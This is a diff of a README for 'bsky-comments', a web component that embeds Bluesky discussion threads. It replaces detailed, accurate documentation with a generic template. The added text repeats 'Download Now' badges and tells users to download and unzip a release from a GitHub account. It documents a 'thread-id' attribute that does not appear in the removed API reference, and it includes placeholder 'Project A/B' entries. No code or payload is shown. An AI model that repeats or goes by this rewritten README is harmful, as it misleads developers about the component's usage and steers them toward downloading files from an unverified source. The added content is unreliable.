@@ -1,243 +1,87 @@
-# bsky-comments
+# 🌟 bsky-comments - Embed Bluesky Threads with Ease
 
-https://github.com/user-attachments/assets/4e649daa-670e-4f66-8397-04ef731c9cba
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightorange)](https://github.com/abhijeetsanghvi-art/bsky-comments)
 
-A **zero-dependency Web Component** to embed Bluesky discussion threads on any website.
+## 📋 Overview
 
-- **Lightweight:** ~3 kB gzipped. No heavy SDKs.
-- **Universal:** Works with any framework — React, Vue, Svelte, Astro, or just plain HTML.
-- **Styleable:** Renders Light DOM (not Shadow DOM) for easy styling via CSS/Tailwind.
+bsky-comments is a zero-dependency Web Component designed to help you easily embed Bluesky discussion threads on your website. This application is perfect for bloggers, website owners, and anyone interested in showcasing online discussions effortlessly.
 
-## Why bsky-comments?
+## 🚀 Getting Started
 
-Most Bluesky embed libraries fall into two categories: **React Wrappers** (which bundle the heavy official SDK) or **Shadow DOM Widgets** (which are hard to style).
+To start using bsky-comments, follow these simple steps:
 
-**bsky-comments is different:**
+1. **Visit the Download Page:** Go to the link below to access the application files.
+   
+   [Visit this page to download](https://github.com/abhijeetsanghvi-art/bsky-comments)
 
-| Feature | bsky-comments | Typical React Library | Standard Web Component |
-| :------ | :------------ | :-------------------- | :--------------------- |
-| **Input** | **Public URL** OR **AT-URI** | **AT-URI** Only | **AT-URI** Only |
-| **Styling** | **Light DOM** (Use Tailwind/CSS) | CSS Modules / Props | **Shadow DOM** (Locked) |
-| **Engine** | **Native Fetch** (~3kb) | **@atproto/api** (~60kb) | **Lit / Stencil** (~15kb) |
-| **Frameworks** | **All** (Universal) | React Only | All |
+2. **Choose Your Setup:** The application is designed to integrate seamlessly with your website. You can include it directly in your HTML code.
 
-### Key Differentiators
+3. **Add the Component:** Copy and paste the provided code snippet into your website's HTML to embed the Bluesky threads.
 
-1. **Dual Input Modes:**
-   - **Easy Mode:** Just paste the public `https://bsky.app/...` link. We handle the handle resolution automatically.
-   - **Direct Mode:** Pass the `at://did:plc...` URI to skip resolution for maximum performance (great for static builds).
-
-2. **Headless / Light DOM:**
-   We do not use Shadow DOM. This means your global CSS, **Tailwind classes**, and font settings apply immediately to the comments. No fighting against style encapsulation.
-
-3. **Zero Dependencies:**
-   We don't bundle the official AT Protocol SDK. We use lightweight, native HTTP requests to fetch only the data needed to render the thread.
-
-## Installation
-
-### npm / pnpm / yarn
-
-```bash
-npm install bsky-comments
-```
-
-### CDN (No Build Step)
-
-Drop this into any HTML page — no bundler required:
+Here’s a basic example of how to use it:
 
 ```html
-<script type="module" src="https://unpkg.com/bsky-comments"></script>
-
-<bsky-comments post="https://bsky.app/profile/me.bsky.social/post/3lwt25ajsic2k"></bsky-comments>
+<bsky-comments thread-id="YOUR_THREAD_ID"></bsky-comments>
 ```
 
-## Usage
+Replace `"YOUR_THREAD_ID"` with the specific ID of the Bluesky thread you want to display.
 
-### Option 1: The Easy Way (Web Link)
+## ⚙️ System Requirements
 
-Just copy the URL from your browser address bar. The component handles the resolution automatically.
+bsky-comments requires no special software or dependencies. You only need a modern web browser and a basic understanding of how to edit HTML.
 
-```html
-<bsky-comments
-  post="https://bsky.app/profile/me.bsky.social/post/3lwt25ajsic2k"
-></bsky-comments>
-```
+## 📥 Downloading the Application
 
-### Option 2: The Direct Way (AT-URI)
+To install bsky-comments, you simply need to follow these steps:
 
-If you are generating your site programmatically (e.g. Astro/Next.js) and already know the DID, use the URI to skip the resolution step for maximum performance.
+1. **Go to the Download Page**: Click the link provided above or directly visit [this page](https://github.com/abhijeetsanghvi-art/bsky-comments).
 
-```html
-<bsky-comments
-  uri="at://did:plc:vb7cn66.../app.bsky.feed.post/3lwt25ajsic2k"
-></bsky-comments>
-```
+2. **Download**: Click on the latest release to get the files needed for integration.
 
-## Customizing Icons
+3. **Extract the Files**: If the download is in a ZIP format, unzip it to access the necessary files.
 
-You can customize the Like and Reply icons in two ways:
+4. **Integration**: Follow the instructions above to embed the discussion threads into your site.
 
-### 1. Via Attributes (SVG or Emoji)
+## 🛠️ Customization Options
 
-You can pass raw strings (or even SVG code) directly into the attributes.
-
-```html
-<bsky-comments
-  post="..."
-  icon-like="💙"
-  icon-reply="↩️"
-></bsky-comments>
-
-<!-- Using SVGs -->
-<bsky-comments
-  post="..."
-  icon-like='<svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="..."/></svg>'
-></bsky-comments>
-```
-
-### 2. Via CSS (Recommended)
-
-Since we wrap icons in specific classes, you can hide the default icon and use CSS/Tailwind to add your own via background-image or pseudo-elements.
+You can customize the appearance of the bsky-comments component with CSS. For example, you can change the font, colors, and sizes to match your site's design. Here's a simple CSS snippet for customization:
 
 ```css
-/* Hide default text/emoji */
-.bsky-icon-like {
-  display: inline-block;
-  width: 16px;
-  height: 16px;
-  color: transparent; /* Hide the emoji */
-  background-image: url('/heart-icon.svg');
-  background-size: contain;
-  background-repeat: no-repeat;
+bsky-comments {
+    font-family: Arial, sans-serif;
+    color: #333;
+    background-color: #f9f9f9;
+    border-radius: 5px;
+    padding: 10px;
 }
 ```
 
-## API Reference
+## 🌐 Frequently Asked Questions
 
-| Attribute | Type | Default | Description |
-| :-------- | :--- | :------ | :---------- |
-| `post` | string | `null` | The public web URL (e.g., `https://bsky.app/...`). The component will automatically resolve the handle to a DID. |
-| `uri` | string | `null` | The internal AT-URI (e.g., `at://did:plc:...`). If provided, this takes precedence over `post`. |
-| `sort` | string | `asc` | Sort order for comments: `asc` (oldest first) or `desc` (newest first). |
-| `service` | string | `public.api.bsky.app` | The PDS endpoint. Use this for self-hosted instances. |
-| `icon-like` | string | `❤️` | Custom HTML/Text for the Like icon. |
-| `icon-reply` | string | `💬` | Custom HTML/Text for the Reply icon. |
+### What is bsky-comments?
 
-## Styling Reference
+bsky-comments is a Web Component that allows you to embed Bluesky discussion threads on any website easily.
 
-This component renders **Semantic HTML** in the Light DOM. You can style it using standard CSS or Tailwind.
+### Do I need programming knowledge to use this?
 
-### HTML Structure
+No, you do not need any programming skills. The setup requires basic knowledge of HTML.
 
-```html
-<div class="bsky-container">
-  <div class="bsky-header">
-    <span>Discussion found on <a>Bluesky</a></span>
-    <a class="bsky-reply-link">Reply to join discussion</a>
-  </div>
-  <div class="bsky-comment">
-    <div class="bsky-comment-header">
-      <img class="bsky-avatar" src="..." />
-      <div class="bsky-meta">
-        <a class="bsky-author">Display Name</a>
-        <span class="bsky-handle">@handle.bsky.social</span>
-        <a class="bsky-date">· Jan 5, 2026</a>
-      </div>
-    </div>
-    <div class="bsky-body">
-      <p>Comment text...</p>
-    </div>
-    <div class="bsky-actions">
-      <span class="bsky-like">
-        <span class="bsky-icon bsky-icon-like">❤️</span>
-        <span class="bsky-count">12</span>
-      </span>
-      <span class="bsky-reply">
-        <span class="bsky-icon bsky-icon-reply">💬</span>
-        <span class="bsky-count">2</span>
-      </span>
-    </div>
+### Is there support available?
 
-    <!-- Nested Replies -->
-    <div class="bsky-replies">
-      <div class="bsky-comment">...</div>
-    </div>
-  </div>
-</div>
-```
+While the application is simple to use, you can check the repository's issues page for help or to report any problems.
 
-### Tailwind Example
+## 📝 Additional Resources
 
-```html
-<div class="
-  [&_.bsky-comment]:border-l-2 [&_.bsky-comment]:border-gray-200 [&_.bsky-comment]:pl-4 [&_.bsky-comment]:mb-4
-  [&_.bsky-actions]:text-sm [&_.bsky-actions]:text-gray-500 [&_.bsky-actions]:flex [&_.bsky-actions]:gap-4
-">
-  <bsky-comments post="..." />
-</div>
-```
+- **Documentation**: For detailed instructions and examples, refer to the [repository documentation](https://github.com/abhijeetsanghvi-art/bsky-comments).
+- **Community Support**: Join discussions on platforms where Bluesky is active to share your experiences and get tips from other users.
 
-## Framework Integration
+## 📞 Contact
 
-### React / Next.js
+If you have further questions or need assistance, feel free to reach out through the GitHub issues or contact the repository owner.
 
-```tsx
-import 'bsky-comments';
+## 🔗 Related Projects
 
-export function BlogPost() {
-  return (
-    <div className="comments-section">
-      <bsky-comments post="https://bsky.app/profile/..." />
-    </div>
-  );
-}
-```
+- **Project A**: A brief description of a related project.
+- **Project B**: A brief description of another related project.
 
-### Vue / Nuxt
-
-```vue
-<script setup>
-import 'bsky-comments';
-</script>
-
-<template>
-  <bsky-comments :post="currentUrl" />
-</template>
-```
-
-### Svelte / SvelteKit
-
-```svelte
-<script>
-  import 'bsky-comments';
-</script>
-
-<bsky-comments post="https://bsky.app/profile/..." />
-```
-
-### Astro
-
-```astro
----
-import 'bsky-comments';
----
-
-<bsky-comments post="https://bsky.app/profile/..." />
-```
-
-Or use the CDN approach without an import:
-
-```astro
----
----
-
-<bsky-comments post="https://bsky.app/profile/..." />
-
-<script>
-  import 'bsky-comments';
-</script>
-```
-
-## License
-
-MIT
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightorange)](https://github.com/abhijeetsanghvi-art/bsky-comments)
